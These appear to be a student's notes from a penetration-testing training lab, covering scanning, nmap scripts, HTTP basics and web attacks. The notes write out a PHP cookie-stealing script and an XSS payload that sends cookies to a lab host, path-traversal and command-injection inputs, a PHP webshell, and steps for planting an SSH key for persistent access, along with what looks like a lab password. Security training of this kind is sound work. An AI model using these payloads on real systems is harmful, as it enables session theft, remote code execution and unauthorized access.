stack 20 | MIBL-004-M  | FsUjGECRv3HDTQt | 10.50.40.227

DAY1
   
   SCANNING AND RECONAISSANCE
       Scraping data script
         #sudo pip3 install lxml
         #sudo pip3 install requests
          
          import lxml.html
          import requests

          page = requests.get('http://quotes.toscrape.com')
          tree = lxml.html.fromstring(page.content)

          authors = tree.xpath('//small[@class="author"]/text()')

          print ('Authors: ',authors)
          
          SCANNING STEPS
          
            Host Discovery
              Find hosts that are online
            Host Enumeration
              Find ports for each host that is online
            Host Interrogation
              Find what service is running on each open/available port
          
          PASSIVE RECON  
          
            cat /etc/os-release - provides OS info

            lsb_release -a - provides OS info

            uname -a - print system information

            hostnamectl - print system information in a cleaned up format

            ip addr - print IP addresses with interfaces

          NMAP SCRIPTS
          
           /usr/share/nmap/scripts
            nmap --script <filename>|<category>|<directory>
            nmap --script-help "ftp-* and discovery"
            nmap --script-args <args>
            nmap --script-args-file <filename>
            nmap --script-help <filename>|<category>|<directory>
            nmap --script-trace
            
            maybe remember these , important or something idk
              http-enum
              http-robots.txt.nse
              smb-os-discovery
              --script"discovery" - runs all discovery type scripts
              
            for i in {1..254}; do (ping -c 1 x.x.x.$i | grep "bytes from" &) ;done 
            
            nmap -Pn -T4 xxx.xxx.xxx.xxx -p- --min-rate=8000
            
            nc xxx.xxx.xxx.xxx (port)
            
            !!! ports 445,9999,3389 being open = telltale sign that you just scanned a windows box !!!
            
            
DAY2
            
    HTTP
        - request
        - reply
      Methods
        - GET *** requesting/retrieving data
        - HEAD 
        - POST *** sending information i.e. login credentials
      ## GET / HTTP/1.1
        - GET *** HTTP method to request/retrieve
        - / *** www.google.com/
        - HTTP/1.1 *** HTTP version being used
      Status Codes
        - 1xx = Informational response
        - 2xx = successful
        - 3xx = Redirection
        - 4xx = Client Error
        - 5xx = Server Error
      Developer Console
        1. Open a web page in firefox
        2. Right click -> view page source
        3. press f12
            document.location; document.cookie; function(); can run existing functions on the website
    WGET & CURL
        WGET
            wget -r -l2 -P /tmp ftp://ftpserver/
             ^ -r recursive, -l2 2 layers deep, -P /tmp saves to tmp directory
                - Per Jake, do not rely on WGET as a crutch
       CURL
            curl -o imstuff.html hhtp://www.reddit.com
            curl 'website' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png *** Send Cookie settings with data, then pipe results
    JavaScript
       js interactive - <script> function myFunction() { document.getElementById("demo").innerHTML = "Paragraph changed.";} </script>
            1. f12 thing
            2. 'console' tab
            3. can run function, i.e. 'changeText()'
        
        
        
                 Web Enumeration Steps
                         The goal of web enumeration is to find out the existing webpages and webdirectories
                                    - Host Discovery (ping sweep)
                                    - Host Enumeration (port scan) nmap -Pn -T5 x.x.x.x -p-
                                    - Service enumeration (-sV|banner.nse) nmap -Pn -T5 x.x.x.x -sV -p <ports> nmap -Pn -T5 x.x.x.x --script=banner.nse -p <ports>
                                    - Web Enumeration nmap -Pn -T5 -sT -p 80 --script http-enum.nse x.x.x.x nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse x.x.x.x nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse x.x.x.x
                                      ^ robots.txt finds webpages you can navigate to outside of the normal means
                                  So what actually is the robots.txt file?
                                   Robots.txt tells webcrawlers what can and cannot be indexed  Ex. http://foxnews.com/robots.txt
   
       nikto v -h xxx.xxx.xxx.xxx *** good stuff
    
    Cross-site Scripting (XSS)
         <script>alert('XSS');</script> 
            - find a space where you can enter a value, f12 to see if theres a javascript
            - input that command into said space, try double quotes in single didnt work
            - if determined the field is vunerable,
                     vi cookie_stealer.php
                       <?php
                       $cookie = $_GET["username"];
                       $steal = fopen("/var/www/html/(** complete path to upload location (demo: /uploads)**)/cookiefile.txt", "a+");
                       fwrite($steal, $cookie . "\n");
                       fclose($steal);
                       ?>
            - find file upload prompt on site 
            - /robots.txt to find potential locations
            - navigate to said location (yippie? maybe, hopefully)
            - **
            - upload cookiefile.txt
            - navigate back to original input field 
            - <script>document.location="http://10.50.22.27/uploads/cookies_stealer.php?username="+document.cookie;</script>
                                         ^^ path to where ever your file uploads ^^     ^^ whatever GET variable was set as              
                              
         
    Server-Side Injection
      view_image.php?file=../../../../../../etc/passwd ** can't have too many ../, over 15 then touch grass
        - ideal situation: "file to read: " prompt
         - view page source
        - if successful, will display /etc/passwd and can see users to target
        
        
        
        Malicious File Upload (Webshell)
        
        - Can you upload? Yes (.php)
        - Are file extensions being sanitized? No
        - Can you access the uploads directory? Yes
        
    webshell.php:
        <HTML><BODY>
        <FORM METHOD="GET" NAME="myform" ACTION="">
        <INPUT TYPE="text" NAME="cmd">
     #  <INPUT TYPE="submit" VALUE="Send">
        </FORM>
     #  <pre>
        <?php
     #  if($_GET['cmd']) {
          system($_GET['cmd']);
          }
        ?>
     #  </pre>
        </BODY></HTML>
    
        - Go back to 10.50.34.125/cmdinjection/cmdinjectdemo.php
        - try entering commands (must have a semicolon before command, i.e. ; whoami)
    
    
    SSH Keys 
       ssh student@x.x.x.x password
     on whichever host you plan on logging infrom, generate keys
       - ssh-keygen -t rsa -b 4096
        - public key is found in /home/student/.ssh/id_rsa.pub (cat)
     Determine usr's home directory
     ;cat /etc/passwd
       - www-date:x:33:33:www-data:/var/www:/bin/bash
       - user: www-data
       - home dir: /var/www
       - login shell: /bin/bash
     Determine if .ssh/ directory exists in the users home directory; if not, create it
       - ;mkdir /var/www/.ssh
     Validate the .ssh/ directory has been created
       - ;ls -la /var/www
    Inject our key into the authorized_keys file (create directory if needed)
       - echo  'ssh-rsa XcsEHSnd...== student@lin-ops' > /var/www/.ssh/authorized_keys
    Validate the public is inside the authorized_keys file
       - ;cat /var/www/.ssh/authorized_keys
    Login from the workstation you generated the key from
       - ssh www-data@x.x.x.x
    
    
    
    
    
    
